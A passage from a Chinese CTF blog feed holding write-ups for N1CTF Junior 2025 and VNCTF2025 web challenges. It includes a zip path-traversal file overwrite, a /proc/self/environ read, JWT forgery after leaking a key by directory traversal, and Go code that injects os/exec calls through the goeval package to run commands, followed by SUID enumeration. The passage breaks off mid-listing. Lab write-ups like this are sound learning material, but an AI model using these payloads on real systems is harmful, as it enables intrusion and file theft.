comment"># the name of the malicious file that will overwrite the origial file (must exist on disk)</span>fname <span class="token operator">=</span> <span class="token string">'dynamic.yml'</span><span class="token comment">#destination path of the file</span>zf<span class="token punctuation">.</span>write<span class="token punctuation">(</span>fname<span class="token punctuation">,</span> <span class="token string">'../../../../../app/.config/dynamic.yml'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上传，此时的 dynamic.yml 就是我们构造的配置文件了</p><p>直接访问 &#x2F;flag 即可</p><p><img src="/blog/2025/02/09/N1CTF-Junior-2025/image-20250210214233462.png" alt="image-20250210214233462"></p><hr><h1 id="EasyDB（Unsolved）"><a href="#EasyDB（Unsolved）" class="headerlink" title="EasyDB（Unsolved）"></a>EasyDB（Unsolved）</h1><p>代码逻辑十分简单，就一个登录登出，账密 admin:admin</p><p>然后就是 jdbc</p><p>不会</p><hr><h1 id="display（Unsolved）"><a href="#display（Unsolved）" class="headerlink" title="display（Unsolved）"></a>display（Unsolved）</h1><blockquote><p>用iframe嵌入子页面可以重新唤起DOM解析器解析script标签</p></blockquote><p>短短一行限制：<code>const csp = &quot;script-src &#39;self&#39;; object-src &#39;none&#39;; base-uri &#39;none&#39;;&quot;;</code></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;比隔壁好打（&lt;/p&gt;
&lt;p&gt;&lt;del&gt;我要是大一就好了&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/blog/2025/02/09/N1CTF-Junior-2025/image-20250210232233018.png&quot; alt=&quot;image-20250210232233018&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTF线上赛" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>VNCTF2025</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/02/08/VNCTF2025/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/02/08/VNCTF2025/</id>
    <published>2025-02-08T02:21:47.000Z</published>
    <updated>2025-02-11T16:42:04.331Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>完 全 败 北</p><p>去年是遗憾，今年是惨败</p><p>第三年了，本以为今年能打出一个比较满意的成绩，结果web直接爆零了</p><span id="more"></span><hr><h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><h2 id="欢迎！"><a href="#欢迎！" class="headerlink" title="欢迎！"></a>欢迎！</h2><blockquote><p>做不出可以问DeepSeek R1</p></blockquote><p>给了个sed命令执行， 我们可控的位置在替换字符和读取的文件名</p><p>R1启动！使用<code>&amp;</code>保留匹配的内容</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sed</span> <span class="token string">'s/&#123;.*&#125;/&amp;/g'</span> /proc/self/environ<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>flag：<code>VNCTF&#123;wElcome-ANd_H4VE-@-g0OD_TIme_Qfx0BkjJU3SrA39agEv7P3f&#125;</code></p><hr><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="javaGuide（Unsolved）"><a href="#javaGuide（Unsolved）" class="headerlink" title="javaGuide（Unsolved）"></a>javaGuide（Unsolved）</h2><p>过滤：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> <span class="token function">resolveClass</span><span class="token punctuation">(</span><span class="token class-name">ObjectStreamClass</span> desc<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> className <span class="token operator">=</span> desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> denyClasses <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax"</span><span class="token punctuation">,</span> <span class="token string">"javax.management"</span><span class="token punctuation">,</span> <span class="token string">"com.fasterxml.jackson"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> var5 <span class="token operator">=</span> denyClasses<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var5 <span class="token operator">=</span> denyClasses<span class="token punctuation">;</span>    <span class="token keyword">int</span> var6 <span class="token operator">=</span> denyClasses<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> var7 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> var7 <span class="token operator">&lt;</span> var6<span class="token punctuation">;</span> <span class="token operator">++</span>var7<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> denyClass <span class="token operator">=</span> var5<span class="token punctuation">[</span>var7<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span>denyClass<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">InvalidClassException</span><span class="token punctuation">(</span><span class="token string">"Unauthorized deserialization attempt"</span><span class="token punctuation">,</span> className<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">resolveClass</span><span class="token punctuation">(</span>desc<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>控制器：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">IndexController</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">IndexController</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"hello"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/deser"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">String</span> payload<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> decode <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">MyObjectInputStream</span> myObjectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>decode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            myObjectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token string">"ok"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InvalidClassException</span> var4<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> var4<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var5<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var5<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token string">"exception"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>很明显是要在不用 com.sun.org.apache.xalan.internal.xsltc.trax , javax.management , com.fasterxml.jackson 的情况下打java反序列化，这ban的都是template和jackson链</p><p>看一下有什么依赖</p><p><img src="/blog/2025/02/08/VNCTF2025/image-20250208104311548.png" alt="image-20250208104311548"></p><p>没cc也是java反序列化的第一步吗（</p><p>fastjson1.2.83不出网</p><hr><h2 id="奶龙回家（Unsolved）"><a href="#奶龙回家（Unsolved）" class="headerlink" title="奶龙回家（Unsolved）"></a>奶龙回家（Unsolved）</h2><blockquote><p>本题考点是注入攻击，无需进行字典爆破操作</p></blockquote><p>测试发现账密处ban了&#x3D;，sleep，空格，union</p><hr><h2 id="学生姓名登记系统（Unsolved）"><a href="#学生姓名登记系统（Unsolved）" class="headerlink" title="学生姓名登记系统（Unsolved）"></a>学生姓名登记系统（Unsolved）</h2><p>ssti</p><p>每行长度限制23</p><p>不解析 lipsum，config，url_for，每一行必须都能解析才能解析ssti</p><p>ban 了 eval</p><p>不让 import</p><hr><h2 id="Gin（Unsolved）"><a href="#Gin（Unsolved）" class="headerlink" title="Gin（Unsolved）"></a>Gin（Unsolved）</h2><p>后面时间全梭哈这题了</p><p>注册登录后有一个文件上传的接口</p><p>上传后有一个文件下载的接口，可以目录穿越下载 key.go</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> config<span class="token keyword">func</span> <span class="token function">Key</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token string">"r00t32l"</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">Year</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">int64</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token number">2025</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>本地生成key</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"fmt"</span><span class="token string">"math/rand"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">GenerateKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">&#123;</span>rand<span class="token punctuation">.</span><span class="token function">Seed</span><span class="token punctuation">(</span><span class="token number">2025</span><span class="token punctuation">)</span>randomNumber <span class="token operator">:=</span> rand<span class="token punctuation">.</span><span class="token function">Intn</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span>key <span class="token operator">:=</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"%03d%s"</span><span class="token punctuation">,</span> randomNumber<span class="token punctuation">,</span> <span class="token string">"r00t32l"</span><span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token keyword">return</span> key<span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">GenerateKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到key：<code>122r00t32l</code></p><p>然后伪造 jwt 的 username 为admin即可登录admin</p><p><img src="/blog/2025/02/08/VNCTF2025/image-20250208220615435.png" alt="image-20250208220615435"></p><p>来到admin的代码执行</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">Eval</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>code <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">PostForm</span><span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token keyword">if</span> code <span class="token operator">==</span> <span class="token string">""</span> <span class="token punctuation">&#123;</span>response<span class="token punctuation">.</span><span class="token function">Response</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> http<span class="token punctuation">.</span>StatusBadRequest<span class="token punctuation">,</span> <span class="token number">400</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> <span class="token string">"No code provided"</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span>log<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token function">containsBannedPackages</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token function">containsBannedPackages</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>response<span class="token punctuation">.</span><span class="token function">Response</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> http<span class="token punctuation">.</span>StatusBadRequest<span class="token punctuation">,</span> <span class="token number">400</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> <span class="token string">"Code contains banned packages"</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span>tmpFile<span class="token punctuation">,</span> err <span class="token operator">:=</span> ioutil<span class="token punctuation">.</span><span class="token function">TempFile</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"goeval-*.go"</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>log<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"Error creating temp file:"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>response<span class="token punctuation">.</span><span class="token function">Response</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> http<span class="token punctuation">.</span>StatusInternalServerError<span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> <span class="token string">"Error creating temporary file"</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span><span class="token keyword">defer</span> os<span class="token punctuation">.</span><span class="token function">Remove</span><span class="token punctuation">(</span>tmpFile<span class="token punctuation">.</span><span class="token function">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token boolean">_</span><span class="token punctuation">,</span> err <span class="token operator">=</span> tmpFile<span class="token punctuation">.</span><span class="token function">WriteString</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>log<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"Error writing code to temp file:"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>response<span class="token punctuation">.</span><span class="token function">Response</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> http<span class="token punctuation">.</span>StatusInternalServerError<span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> <span class="token string">"Error writing code to temp file"</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span>cmd <span class="token operator">:=</span> exec<span class="token punctuation">.</span><span class="token function">Command</span><span class="token punctuation">(</span><span class="token string">"go"</span><span class="token punctuation">,</span> <span class="token string">"run"</span><span class="token punctuation">,</span> tmpFile<span class="token punctuation">.</span><span class="token function">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>output<span class="token punctuation">,</span> err <span class="token operator">:=</span> cmd<span class="token punctuation">.</span><span class="token function">CombinedOutput</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>log<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"Error running Go code:"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>response<span class="token punctuation">.</span><span class="token function">Response</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> http<span class="token punctuation">.</span>StatusInternalServerError<span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"error"</span><span class="token punctuation">:</span> <span class="token function">string</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">"Error executing code"</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span>response<span class="token punctuation">.</span><span class="token function">Success</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"result"</span><span class="token punctuation">:</span> <span class="token function">string</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">"success"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">containsBannedPackages</span><span class="token punctuation">(</span>code <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">bool</span> <span class="token punctuation">&#123;</span>importRegex <span class="token operator">:=</span> <span class="token string">`(?i)import\s*\((?s:.*?)\)`</span>re <span class="token operator">:=</span> regexp<span class="token punctuation">.</span><span class="token function">MustCompile</span><span class="token punctuation">(</span>importRegex<span class="token punctuation">)</span>matches <span class="token operator">:=</span> re<span class="token punctuation">.</span><span class="token function">FindStringSubmatch</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span>imports <span class="token operator">:=</span> matches<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>log<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>imports<span class="token punctuation">)</span><span class="token keyword">if</span> strings<span class="token punctuation">.</span><span class="token function">Contains</span><span class="token punctuation">(</span>imports<span class="token punctuation">,</span> <span class="token string">"os/exec"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ban 了 os&#x2F;exec 依赖</p><p>尝试读文件：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"fmt"</span><span class="token string">"os"</span><span class="token string">"syscall"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>file<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"Error opening file:"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span><span class="token keyword">defer</span> file<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>buffer <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span>n<span class="token punctuation">,</span> err <span class="token operator">:=</span> syscall<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span><span class="token function">int</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">Fd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"Error reading file:"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span>fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"Read %d bytes: %s\n"</span><span class="token punctuation">,</span> n<span class="token punctuation">,</span> buffer<span class="token punctuation">[</span><span class="token punctuation">:</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&#x2F;flag 的内容是<code>VNCTF2025!!!</code></p><p>尝试用cgo执行命令</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token comment">/*#include &lt;stdio.h>#include &lt;stdlib.h>void execute() &#123;    system("ls />/GinTest/uploads/1.txt");&#125;*/</span><span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"C"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>C<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>返回<code>go: no Go source files</code>，寄了</p><p>看下环境变量</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable"><span class="token environment constant">SHELL</span></span><span class="token operator">=</span>/bin/bash<span class="token assign-left variable">SUDO_GID</span><span class="token operator">=</span><span class="token number">0</span><span class="token assign-left variable"><span class="token environment constant">HOSTNAME</span></span><span class="token operator">=</span>ret2shell-47-1447<span class="token assign-left variable">SUDO_COMMAND</span><span class="token operator">=</span>/bin/bash<span class="token assign-left variable">SUDO_USER</span><span class="token operator">=</span>root<span class="token assign-left variable"><span class="token environment constant">PWD</span></span><span class="token operator">=</span>/GinTest<span class="token assign-left variable"><span class="token environment constant">LOGNAME</span></span><span class="token operator">=</span>ctfer<span class="token assign-left variable"><span class="token environment constant">HOME</span></span><span class="token operator">=</span>/home/ctfer<span class="token assign-left variable"><span class="token environment constant">TERM</span></span><span class="token operator">=</span>unknown<span class="token assign-left variable"><span class="token environment constant">USER</span></span><span class="token operator">=</span>ctfer<span class="token assign-left variable">GOPROXY</span><span class="token operator">=</span>https://proxy.golang.org,direct<span class="token assign-left variable"><span class="token environment constant">SHLVL</span></span><span class="token operator">=</span><span class="token number">1</span><span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/usr/local/go/bin:/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/go/bin<span class="token assign-left variable">SUDO_UID</span><span class="token operator">=</span><span class="token number">0</span><span class="token assign-left variable">MAIL</span><span class="token operator">=</span>/var/mail/ctfer<span class="token assign-left variable"><span class="token environment constant">OLDPWD</span></span><span class="token operator">=</span>/home/ctfer<span class="token assign-left variable">_</span><span class="token operator">=</span>./GinTest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>尝试只使用 os&#x2F;exec 命令执行：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"os/exec"</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    cmd <span class="token operator">:=</span> exec<span class="token punctuation">.</span><span class="token function">Command</span><span class="token punctuation">(</span><span class="token string">"ls />/GinTest/uploads/1.txt"</span><span class="token punctuation">)</span>    <span class="token boolean">_</span><span class="token punctuation">,</span> err <span class="token operator">:=</span> cmd<span class="token punctuation">.</span><span class="token function">Output</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>返回500，最后发现import这里必须要有<code>()</code></p><br><p>发现可以拉 goeval 依赖来命令执行</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"fmt"</span><span class="token string">"github.com/PaulXu-cn/goeval"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>Package <span class="token operator">:=</span> <span class="token string">"\"os/exec\"\n fmt\"\n)\n\nfunc\tinit()&#123;\ncmd:=exec.Command(\"ls\",\"/\")\nout,_:=cmd.CombinedOutput()\nfmt.Println(string(out))\n&#125;\n\n\nvar(a=\"1"</span>eval<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> goeval<span class="token punctuation">.</span><span class="token function">Eval</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"fmt.Println(\"\")"</span><span class="token punctuation">,</span> Package<span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token function">string</span><span class="token punctuation">(</span>eval<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/02/08/VNCTF2025/image-20250208204029737.png" alt="image-20250208204029737"></p><p>然后find提权</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/usr/bin/umount/usr/bin/chfn/usr/bin/chsh/usr/bin/passwd/usr/bin/newgrp/usr/bin/su/usr/bin/mount/usr/bin/sudo/<span class="token punctuation">..</span>./Cat<span 